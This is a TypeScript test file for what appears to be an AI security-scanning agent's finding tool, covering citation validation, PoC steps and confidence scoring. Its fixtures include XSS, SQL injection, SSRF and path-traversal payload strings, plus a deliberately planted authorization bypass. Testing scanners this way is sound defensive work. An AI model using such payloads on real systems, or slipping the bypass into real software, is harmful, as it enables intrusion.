import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { ToolExecutor, getToolsForRole, TOOL_DEFINITIONS, evaluateDoneCoverageGate, sanitizedEnv, toolExecutorCheckpointSchema } from "./tools.js";
import { parseFindingsFromCliOutput } from "../findings-parser.js";
import type { ToolContext, ToolCall } from "./types.js";
import { execFileSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

const ORIGINAL_JIT_SKILLS_ENV = process.env["ZERO_FEATURE_JIT_SKILLS"];
const ORIGINAL_LOOT_LEDGER_ENV = process.env["ZERO_FEATURE_LOOT_LEDGER"];
const ORIGINAL_CLOUD_SURFACE_ENV = process.env["ZERO_FEATURE_CLOUD_SURFACE"];
const ORIGINAL_ZEROVERSE_ENV = process.env["ZERO_FEATURE_ZEROVERSE"];

afterEach(() => {
  if (ORIGINAL_JIT_SKILLS_ENV === undefined) delete process.env["ZERO_FEATURE_JIT_SKILLS"];
  else process.env["ZERO_FEATURE_JIT_SKILLS"] = ORIGINAL_JIT_SKILLS_ENV;
  if (ORIGINAL_LOOT_LEDGER_ENV === undefined) delete process.env["ZERO_FEATURE_LOOT_LEDGER"];
  else process.env["ZERO_FEATURE_LOOT_LEDGER"] = ORIGINAL_LOOT_LEDGER_ENV;
  // 0#925: cloud-surface defaults OFF; reset so tests that pin it ON don't leak.
  if (ORIGINAL_CLOUD_SURFACE_ENV === undefined) delete process.env["ZERO_FEATURE_CLOUD_SURFACE"];
  else process.env["ZERO_FEATURE_CLOUD_SURFACE"] = ORIGINAL_CLOUD_SURFACE_ENV;
  if (ORIGINAL_ZEROVERSE_ENV === undefined) delete process.env["ZERO_FEATURE_ZEROVERSE"];
  else process.env["ZERO_FEATURE_ZEROVERSE"] = ORIGINAL_ZEROVERSE_ENV;
});

// Mock transport only; URL and crawl policy still run in ToolExecutor.
const mockFetchScoped = vi.hoisted(() =>
  vi.fn(async (_url: string, _init?: RequestInit, _policy?: unknown) =>
    new Response("ok", { status: 200, headers: { "content-type": "text/plain" } }),
  ),
);
vi.mock("../http.js", async (importOriginal) => {
  const http = await importOriginal<object>();
  return { ...http, fetchScoped: mockFetchScoped };
});

beforeEach(() => {
  mockFetchScoped.mockReset();
  mockFetchScoped.mockImplementation(async (_url: string, _init?: RequestInit) =>
    new Response("ok", { status: 200, headers: { "content-type": "text/plain" } }),
  );
});

// ── Tool Registry ──

describe("TOOL_DEFINITIONS", () => {
  it("registers exactly the minimal toolset", () => {
    expect(Object.keys(TOOL_DEFINITIONS).sort()).toEqual([
      "ask_operator", "bash", "finding", "load_skill", "memory", "spawn_agent", "str_replace", "web_search",
    ]);
  });
});

// ── ToolExecutor ──

describe("ToolExecutor", () => {
  let ctx: ToolContext;
  let executor: ToolExecutor;

  beforeEach(() => {
    ctx = {
      target: "https://example.com",
      scanId: "test-scan-123",
      findings: [],
      attackResults: [],
      targetInfo: {},
      // The tokenised command path and the scoped source-audit allow-list belong to the ask-first policy.
      approvals: "ask",
    };
    executor = new ToolExecutor(ctx, null);
  });

  // ── finding ──

  it("finding adds to context findings", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Test XSS",
        severity: "high",
        category: "xss",
        evidence_request: "GET /test",
        evidence_response: "<script>alert(1)</script>",
        evidence_analysis: "Reflected XSS in response",
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    expect(ctx.findings[0].title).toBe("Test XSS");
    expect(ctx.findings[0].severity).toBe("high");
    expect(ctx.findings[0].status).toBe("discovered");
    expect(ctx.findings[0].id).toBeTruthy();
  });

  it("finding evaluates only code predicates in the scoped source workspace", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-source-check-"));
    try {
      writeFileSync(join(root, "source.ts"), "unsafe(input)\n");
      const scopedContext: ToolContext = {
        ...ctx,
        findings: [],
        scopePath: root,
      };
      const scopedExecutor = new ToolExecutor(scopedContext, null);
      const result = await scopedExecutor.execute({
        name: "finding",
        arguments: {
          title: "Unsafe source parser",
          severity: "high",
          category: "missing-validation",
          evidence_request: "source.ts:1",
          evidence_response: "Source inspection found an unvalidated call.",
          verification_spec: {
            code: [{ kind: "file-contains", file: "source.ts", pattern: "unsafe\\(input\\)" }],
            behavior: {
              steps: [{ method: "GET", path: "http://127.0.0.1:1/never-run", expect: "success" }],
            },
          },
        },
      });

      expect(result.success).toBe(true);
      expect(scopedContext.findings[0]?.sourceVerification).toEqual({
        status: "matched",
        totalPredicates: 1,
        matchedPredicates: 1,
        notMatchedPredicates: 0,
        inconclusivePredicates: 0,
        behaviorPending: true,
      });
      expect(scopedContext.findings[0]?.verification_result).toBeUndefined();
      expect(scopedContext.findings[0]?.status).toBe("discovered");
      expect(mockFetchScoped).not.toHaveBeenCalled();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding reports unmatched code predicates as not confirmed", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-source-check-not-confirmed-"));
    try {
      writeFileSync(join(root, "source.ts"), "safe(input)\n");
      const scopedContext: ToolContext = {
        ...ctx,
        findings: [],
        scopePath: root,
      };
      const scopedExecutor = new ToolExecutor(scopedContext, null);
      const result = await scopedExecutor.execute({
        name: "finding",
        arguments: {
          title: "Source predicate no longer matches",
          severity: "medium",
          category: "missing-validation",
          evidence_request: "source inspection",
          evidence_response: "The expected unsafe call was absent.",
          verification_spec: {
            code: [{ kind: "file-contains", file: "source.ts", pattern: "unsafe\\(input\\)" }],
          },
        },
      });

      expect(result.success).toBe(true);
      expect(scopedContext.findings[0]?.sourceVerification).toEqual({
        status: "not_confirmed",
        totalPredicates: 1,
        matchedPredicates: 0,
        notMatchedPredicates: 1,
        inconclusivePredicates: 0,
        behaviorPending: false,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding marks unsupported source predicates inconclusive", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-source-check-inconclusive-"));
    try {
      const scopedContext: ToolContext = {
        ...ctx,
        findings: [],
        scopePath: root,
      };
      const scopedExecutor = new ToolExecutor(scopedContext, null);
      const result = await scopedExecutor.execute({
        name: "finding",
        arguments: {
          title: "Unsupported source predicate",
          severity: "medium",
          category: "missing-validation",
          evidence_request: "source inspection",
          evidence_response: "Source predicate cannot yet be evaluated.",
          verification_spec: {
            code: [{ kind: "ast-shape", file: "source.ts", query: "(call_expression)" }],
          },
        },
      });

      expect(result.success).toBe(true);
      expect(scopedContext.findings[0]?.sourceVerification).toEqual({
        status: "inconclusive",
        totalPredicates: 1,
        matchedPredicates: 0,
        notMatchedPredicates: 0,
        inconclusivePredicates: 1,
        behaviorPending: false,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding omits source results when scope or a valid spec is absent", async () => {
    const noScope = await executor.execute({
      name: "finding",
      arguments: {
        title: "Unscoped source finding",
        severity: "medium",
        category: "missing-validation",
        evidence_request: "source inspection",
        evidence_response: "Source finding saved.",
        verification_spec: {
          code: [{ kind: "file-contains", file: "source.ts", pattern: "unsafe" }],
        },
      },
    });
    expect(noScope.success).toBe(true);
    expect(ctx.findings[0]?.sourceVerification).toBeUndefined();

    const root = mkdtempSync(join(tmpdir(), "0-source-check-no-spec-"));
    try {
      const scopedContext: ToolContext = {
        ...ctx,
        findings: [],
        scopePath: root,
      };
      const scopedExecutor = new ToolExecutor(scopedContext, null);
      const noSpec = await scopedExecutor.execute({
        name: "finding",
        arguments: {
          title: "Scoped finding without a spec",
          severity: "medium",
          category: "missing-validation",
          evidence_request: "source inspection",
          evidence_response: "Source finding saved.",
        },
      });
      expect(noSpec.success).toBe(true);
      expect(scopedContext.findings[0]?.sourceVerification).toBeUndefined();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding records a workspace-contained 0review annotation", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Unvalidated parser input",
          severity: "high",
          category: "missing-validation",
          description: "Input reaches the parser without validation.",
          evidence_request: "parser.ts:1",
          evidence_response: "unsafe(input)",
          source_path: "parser.ts",
          source_start_line: 1,
          suggested_replacement: "safe(validate(input))",
        },
      });

      expect(result.success).toBe(true);
      expect(ctx.findings[0]?.reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 1,
        suggestion: "safe(validate(input))",
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("rejects a suggested replacement cited on context instead of the changed line", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-diff-suggestion-"));
    try {
      execFileSync("git", ["init", "-q"], { cwd: root });
      writeFileSync(join(root, "auth.ts"), "const token = getToken();\nconst match = parse(token);\nif (!match) deny();\n");
      execFileSync("git", ["add", "auth.ts"], { cwd: root });
      execFileSync("git", ["-c", "user.name=Review", "-c", "user.email=review@example.invalid",
        "commit", "-qm", "base"], { cwd: root });
      const base = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root, encoding: "utf8" }).trim();
      writeFileSync(join(root, "auth.ts"), "const token = getToken();\nconst match = parse(token);\nif (false && !match) deny();\n");
      execFileSync("git", ["add", "auth.ts"], { cwd: root });
      execFileSync("git", ["-c", "user.name=Review", "-c", "user.email=review@example.invalid",
        "commit", "-qm", "change"], { cwd: root });

      const context: ToolContext = { ...ctx, findings: [], scopePath: root, diffScopedReview: true, reviewDiffBase: base };
      const finder = new ToolExecutor(context, null);
      const claim = {
        title: "Authorization bypass", category: "security-misconfiguration", severity: "high",
        description: "The changed condition skips the authorization check.",
        evidence_request: "auth.ts:3", source_path: "auth.ts",
        source_original: "if (false && !match) deny();",
        suggested_replacement: "if (!match) deny();",
      };
      const wrong = await finder.execute({ name: "finding", arguments: { ...claim, source_start_line: 2 } });
      expect(wrong.success).toBe(false);
      expect(wrong.error).toContain("changed at 3");
      const misbound = await finder.execute({
        name: "finding",
        arguments: { ...claim, source_start_line: 3, source_original: "const match = parse(token);" },
      });
      expect(misbound.success).toBe(false);
      expect(misbound.error).toContain("exact current text");
      expect(misbound.error).toContain("Lines 3-3 currently read exactly:\nif (false && !match) deny();");
      expect(context.findings).toEqual([]);

      const corrected = await finder.execute({ name: "finding", arguments: { ...claim, source_start_line: 3 } });
      expect(corrected.success).toBe(true);
      expect(context.findings[0]?.reviewAnnotation).toEqual({
        path: "auth.ts", startLine: 3, suggestion: "if (!match) deny();",
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("marks an exact cited source range with an in-tree maintainer marker", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-known-marker-"));
    try {
      writeFileSync(join(root, "parser.ts"), "// HACK: temporary compatibility path\nparse(input);\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Parser length issue",
          severity: "high",
          category: "missing-validation",
          description: "Cited source contains an explicit maintainer HACK marker.",
          evidence_request: "parser.ts:1",
          evidence_response: "parse(input)",
          source_path: "parser.ts",
          source_start_line: 1,
        },
      });

      expect(result.success).toBe(true);
      expect(ctx.findings[0]?.reviewAnnotation?.knownMarker).toBe(true);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("does not mark a citation because a marker appears outside its exact range", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-known-marker-range-"));
    try {
      writeFileSync(join(root, "parser.ts"), "// TODO: unrelated cleanup\nparse(input);\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Parser length issue",
          severity: "high",
          category: "missing-validation",
          description: "Only line two is cited.",
          evidence_request: "parser.ts:2",
          evidence_response: "parse(input)",
          source_path: "parser.ts",
          source_start_line: 2,
        },
      });

      expect(result.success).toBe(true);
      expect(ctx.findings[0]?.reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 2,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects an annotation path outside the workspace", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Bad location",
          severity: "medium",
          category: "other",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "../etc/passwd",
          source_start_line: 1,
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/parent-directory|workspace/i);
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects a backslash annotation path (cloud schema would 400 it)", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Backslash location",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "src\\parser.ts",
          source_start_line: 1,
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/repository-relative|backslash/i);
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects an external symlink citation and accepts an in-scope symlink", async () => {
    const parent = mkdtempSync(join(tmpdir(), "0-finding-symlink-"));
    try {
      const root = join(parent, "scope");
      mkdirSync(root);
      writeFileSync(join(parent, "private.ts"), "private source\n");
      writeFileSync(join(root, "real.ts"), "real source\n");
      symlinkSync(join(parent, "private.ts"), join(root, "external.ts"));
      symlinkSync(join(root, "real.ts"), join(root, "internal.ts"));
      ctx.scopePath = root;
      const claim = {
        title: "Source citation", severity: "medium", category: "missing-validation",
        description: "test", evidence_request: "test", evidence_response: "test", source_start_line: 1,
      };
      const rejected = await executor.execute({ name: "finding", arguments: { ...claim, source_path: "external.ts" } });
      expect(rejected.success).toBe(false);
      expect(rejected.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);
      const accepted = await executor.execute({ name: "finding", arguments: { ...claim, source_path: "internal.ts" } });
      expect(accepted.success).toBe(true);
      expect(ctx.findings).toHaveLength(1);
    } finally {
      rmSync(parent, { recursive: true, force: true });
    }
  });

  it("finding rejects a non-existent source_path (interactive path — repairable error)", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Fabricated file",
          severity: "critical",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "app/users.php",
          source_start_line: 43,
        },
      });
      // Interactive path rejects with a structured validation error so the
      // model can self-correct and re-submit (contrasts with CLI-parsed
      // findings which downgrade to false-positive).
      expect(result.success).toBe(false);
      expect(result.error).toContain("file not found");
      expect(result.error).toContain("app/users.php");
      expect(result.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects an out-of-range source_start_line (interactive path — repairable error)", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n"); // 1 line + terminal newline
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Fabricated line",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 42,
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("exceeds file length");
      expect(result.error).toContain("parser.ts");
      expect(result.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects an out-of-range end_line but keeps an in-range one", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "// 1\n// 2\n// 3\n// 4\n// 5\n");
      ctx.scopePath = root;

      const bad = await executor.execute({
        name: "finding",
        arguments: {
          title: "End line out of range",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 2,
          source_end_line: 42,
        },
      });
      expect(bad.success).toBe(false);
      expect(bad.error).toContain("exceeds file length");
      expect(bad.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);

      const good = await executor.execute({
        name: "finding",
        arguments: {
          title: "End line in range",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 2,
          source_end_line: 4,
        },
      });
      expect(good.success).toBe(true);
      expect(ctx.findings[0].severity).toBe("high");
      expect(ctx.findings[0].status).toBe("discovered");
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 2,
        endLine: 4,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding accepts a directory source_path conservatively (no line check)", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      mkdirSync(join(root, "src"));
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Directory citation",
          severity: "medium",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "src",
          source_start_line: 1,
        },
      });
      // A directory is a real path inside the workspace: not a fabrication,
      // so the finding is kept un-downgraded and the annotation attaches
      // (there is no line count to range-check against).
      expect(result.success).toBe(true);
      expect(ctx.findings[0].status).toBe("discovered");
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "src",
        startLine: 1,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding drops an oversized suggestion instead of rejecting or truncating", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "Oversized suggestion",
          severity: "high",
          category: "missing-validation",
          description: "test",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "parser.ts",
          source_start_line: 1,
          suggested_replacement: "x".repeat(20_001),
        },
      });
      expect(result.success).toBe(true);
      expect(ctx.findings[0].severity).toBe("high");
      expect(ctx.findings[0].status).toBe("discovered");
      // Location kept, suggestion dropped whole (a truncated half-function
      // would apply as broken code).
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "parser.ts",
        startLine: 1,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding drops fenced or unified-diff suggestions but keeps the location", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n");
      ctx.scopePath = root;
      for (const [i, suggestion] of [
        ["```ts", "safe(input)", "```"].join("\n"),
        ["@@ -1,3 +1,3 @@", "-unsafe(input)", "+safe(input)"].join("\n"),
      ].entries()) {
        const result = await executor.execute({
          name: "finding",
          arguments: {
            title: `Unrenderable suggestion ${i}`,
            severity: "high",
            category: "missing-validation",
            description: "test",
            // Distinct evidence prefixes keep the fuzzy dedup (0#281)
            // from merging the two iterations — this test is about the
            // suggestion gate, not dedup.
            evidence_request: `test-${i}`,
            evidence_response: "test",
            source_path: "parser.ts",
            source_start_line: 1,
            suggested_replacement: suggestion,
          },
        });
        expect(result.success).toBe(true);
      }
      expect(ctx.findings).toHaveLength(2);
      for (const f of ctx.findings) {
        expect(f.reviewAnnotation).toEqual({ path: "parser.ts", startLine: 1 });
      }
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("CLI parsing still downgrades fabricated source refs (non-interactive path unchanged)", async () => {
    // Dual-path reference: the CLI parser still downgrades (info /
    // false-positive / triageNote) because the output is post-hoc and has
    // no way to ask the agent for a correction. The interactive tool path
    // (finding) rejects the call instead — verified in the preceding
    // tests.
    const root = mkdtempSync(join(tmpdir(), "0-0review-"));
    try {
      writeFileSync(join(root, "parser.ts"), "unsafe(input)\n"); // 1 line
      ctx.scopePath = root;

      const cli = parseFindingsFromCliOutput(
        JSON.stringify({
          findings: [
            { title: "No such file", severity: "critical", description: "d", file: "nope.ts:1" },
            { title: "Line out of range", severity: "high", description: "d", file: "parser.ts:42" },
          ],
        }),
        { scopePath: root },
      );
      expect(cli).toHaveLength(2);
      for (const f of cli) {
        expect(f.severity).toBe("info");
        expect(f.status).toBe("false-positive");
        expect(f.reviewAnnotation).toBeUndefined();
      }
      expect(cli[0].triageNote).toContain("fabricated path");
      expect(cli[1].triageNote).toContain("fabricated line");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  // ── finding terminal-newline citation boundary regressions ──
  // A real lens CI run found the correct SSRF in a six-source-line Python
  // fixture but submitted source_start_line=7 — the empty split slot after
  // the terminal newline. finding accepted it; evaluation correctly
  // rejected it. These tests verify the fix.

  it("finding rejects a terminal-newline boundary — line 7 in 6-line proxy.py", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-tn-boundary-"));
    try {
      // Six source lines with a terminal newline (the common git checkout case).
      const lines = [
        "#!/usr/bin/env python3",
        "import http.server",
        "",
        "class Handler(http.server.BaseHTTPRequestHandler):",
        '    def do_GET(self):',
        "        self.send_response(200)",
      ];
      writeFileSync(join(root, "proxy.py"), lines.join("\n") + "\n");
      ctx.scopePath = root;

      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "SSRF in proxy.py",
          severity: "high",
          category: "ssrf",
          description: "Server-side request forgery in the proxy handler.",
          evidence_request: "GET /fetch?url=http://attacker.com",
          evidence_response: "200 OK (forwarded response)",
          source_path: "proxy.py",
          source_start_line: 7,
        },
      });

      // Line 7 is the empty slot after the terminal newline — not a real
      // source line. Must reject so the model can re-read and correct.
      expect(result.success).toBe(false);
      expect(result.error).toContain("exceeds file length (6 lines)");
      expect(result.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding rejects a terminal-newline boundary — end_line 7 when file has 5 lines with terminal newline", async () => {
    const root = mkdtempSync(join(tmpdir(), "0-tn-boundary-"));
    try {
      writeFileSync(
        join(root, "fixture.py"),
        "first\nsecond\nthird\nfourth\nfifth\n",
      );
      ctx.scopePath = root;

      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "End line past EOF",
          severity: "high",
          category: "ssrf",
          description: "The end line reference is beyond the last content line.",
          evidence_request: "test",
          evidence_response: "test",
          source_path: "fixture.py",
          source_start_line: 4,
          source_end_line: 7,
        },
      });

      // Line 7 exceeds the 5 content lines (terminal newline doesn't add a
      // real source line). Rejected — the model must correct the range.
      expect(result.success).toBe(false);
      expect(result.error).toContain("exceeds file length (5 lines)");
      expect(result.output?.kind).toBe("validation_failed");
      expect(ctx.findings).toHaveLength(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("finding accepts the last real line in a file with terminal newline", async () => {
    // The same fixture with the correct line = 6 (the last content line).
    // Verifies that the fix did not reject valid citations.
    const root = mkdtempSync(join(tmpdir(), "0-tn-boundary-"));
    try {
      const lines = [
        "#!/usr/bin/env python3",
        "import http.server",
        "",
        "class Handler(http.server.BaseHTTPRequestHandler):",
        '    def do_GET(self):',
        "        self.send_response(200)",
      ];
      writeFileSync(join(root, "proxy.py"), lines.join("\n") + "\n");
      ctx.scopePath = root;

      const result = await executor.execute({
        name: "finding",
        arguments: {
          title: "SSRF in proxy.py",
          severity: "high",
          category: "ssrf",
          description: "Server-side request forgery in the proxy handler.",
          evidence_request: "GET /fetch?url=http://attacker.com",
          evidence_response: "200 OK (forwarded response)",
          source_path: "proxy.py",
          source_start_line: 6,
        },
      });

      // Line 6 is the last content line — must be accepted.
      expect(result.success).toBe(true);
      expect(ctx.findings).toHaveLength(1);
      expect(ctx.findings[0].status).toBe("discovered");
      expect(ctx.findings[0].reviewAnnotation).toEqual({
        path: "proxy.py",
        startLine: 6,
      });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  // ── finding pocSteps emission (0#179) ──

  it("finding populates pocSteps from prose when agent didn't supply them", async () => {
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Auth gap on /admin/users",
        severity: "high",
        category: "auth",
        evidence_request: "GET /admin/users HTTP/1.1\nHost: target.example",
        evidence_response: "HTTP/1.1 200 OK\nContent-Type: application/json",
        evidence_analysis: "Endpoint exposes admin data without authentication.",
      },
    });

    const finding = ctx.findings[0];
    expect(finding.pocSteps).toBeDefined();
    expect(finding.pocSteps!.length).toBeGreaterThanOrEqual(2);
    const exploit = finding.pocSteps!.find((s) => s.kind === "exploit");
    expect(exploit?.action).toEqual({
      type: "http",
      method: "GET",
      url: "/admin/users",
    });
    const verify = finding.pocSteps!.find((s) => s.kind === "verify");
    expect(verify?.expect).toEqual({ type: "http-status", status: 200 });
  });

  it("finding leaves pocSteps undefined when prose has no parseable signals", async () => {
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Vague bug",
        severity: "low",
        category: "info",
        evidence_request: "We poked around the page.",
        evidence_response: "Some interesting output appeared.",
        evidence_analysis: "Unclear if exploitable.",
      },
    });

    expect(ctx.findings[0].pocSteps).toBeUndefined();
  });

  it("finding prefers an agent-supplied pocSteps array over the heuristic", async () => {
    const agentSteps = [
      {
        id: "manual-step",
        kind: "exploit",
        summary: "Hand-crafted graph",
        action: { type: "shell", cmd: "echo crafted-by-agent" },
      },
    ];
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Custom finding",
        severity: "high",
        category: "auth",
        // Prose that would otherwise trigger the heuristic.
        evidence_request: "GET /admin",
        evidence_response: "HTTP/1.1 200 OK",
        evidence_analysis: "Admin endpoint exposed.",
        poc_steps: JSON.stringify(agentSteps),
      },
    });

    const finding = ctx.findings[0];
    expect(finding.pocSteps).toBeDefined();
    expect(finding.pocSteps!.length).toBe(1);
    expect(finding.pocSteps![0].id).toBe("manual-step");
    expect(finding.pocSteps![0].action).toEqual({
      type: "shell",
      cmd: "echo crafted-by-agent",
    });
  });

  // ── finding confidence emission ──
  // Closes the cloud-side gap where every `findings.confidence` row was NULL
  // because @0/cli never emitted a value. See agent/finding-confidence.ts
  // for the hybrid heuristic.

  it("finding stamps confidence onto the finding when the agent reports one", async () => {
    const args = {
      title: "Reflected XSS in /search",
      severity: "high",
      category: "xss",
      evidence_request: "GET /search?q=<script>",
      evidence_response: "<script> echoed",
      evidence_analysis: "no encoding",
      confidence: 0.92,
    };
    await executor.execute({ name: "finding", arguments: args });

    const f = ctx.findings[0];
    expect(typeof f.confidence).toBe("number");
    expect(Number.isFinite(f.confidence)).toBe(true);
    expect(f.confidence!).toBeGreaterThanOrEqual(0);
    expect(f.confidence!).toBeLessThanOrEqual(1);
    expect(f.confidence!).toBeCloseTo(0.92);
    // Mirrored onto the call arguments so the native-loop's local
    // finding_ingested event sees the computed value.
    expect(args.confidence).toBeCloseTo(0.92);
  });

  it("finding clamps an out-of-range LLM-reported confidence", async () => {
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Wild value",
        severity: "high",
        category: "xss",
        evidence_request: "GET /a",
        evidence_response: "ok",
        confidence: 1.7,
      },
    });
    expect(ctx.findings[0].confidence).toBe(1);
  });

  it("finding floors confidence by PoC-status when agent doesn't report one", async () => {
    // Heuristic prose extraction will produce pocSteps with a body-contains
    // / http-status `expect`, so the verifiable floor (0.8) applies.
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Auth gap on /admin/users",
        severity: "high",
        category: "auth",
        evidence_request: "GET /admin/users HTTP/1.1\nHost: target.example",
        evidence_response: "HTTP/1.1 200 OK\nContent-Type: application/json",
        evidence_analysis: "Endpoint exposes admin data without authentication.",
        // No confidence reported.
      },
    });
    const f = ctx.findings[0];
    expect(f.pocSteps).toBeDefined();
    expect(typeof f.confidence).toBe("number");
    expect(f.confidence!).toBeGreaterThanOrEqual(0);
    expect(f.confidence!).toBeLessThanOrEqual(1);
    expect(f.confidence!).toBeGreaterThanOrEqual(0.6);
  });

  it("finding leaves confidence undefined when neither LLM nor PoC signal exists", async () => {
    await executor.execute({
      name: "finding",
      arguments: {
        title: "Vague bug",
        severity: "low",
        category: "info",
        evidence_request: "We poked around the page.",
        evidence_response: "Some interesting output appeared.",
        evidence_analysis: "Unclear if exploitable.",
      },
    });
    expect(ctx.findings[0].pocSteps).toBeUndefined();
    expect(ctx.findings[0].confidence).toBeUndefined();
  });

  // ── impact_assessment validation (0#1103) ────────────────────────────

  it("finding stamps evidence-grounded impact_assessment on the finding", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "SQLi with impact",
        severity: "critical",
        category: "sql-injection",
        evidence_request: "GET /search?q=1' OR '1'='1",
        evidence_response: "MySQL error near line 1",
        impact_assessment: JSON.stringify({
          reachability_tier: "remote-unauth",
          blast_radius: "all users of the search endpoint",
          weaponizability: "rce",
          business_impact: "headline",
          rationale: "Remote unauthenticated attacker can extract the full DB",
        }),
      },
    });
    expect(result.success).toBe(true);
    expect(ctx.findings).toHaveLength(1);
    const f = ctx.findings[0];
    expect(f.impactAssessment).toBeDefined();
    expect(f.impactAssessment!.reachability_tier).toBe("remote-unauth");
    expect(f.impactAssessment!.business_impact).toBe("headline");
  });

  it("finding rejects a malformed JSON impact_assessment", async () => {
    const result = await executor.execute({
      name: "finding",
      arguments: {
        title: "Bad JSON",
        severity: "high",
        category: "xss",
        evidence_request: "x",
        evidence_response: "y",
        impact_assessment: "not valid json",
      },
    });
    expect(result.success).toBe(false);
    expect(ctx.findings).toHaveLength(0);
  });

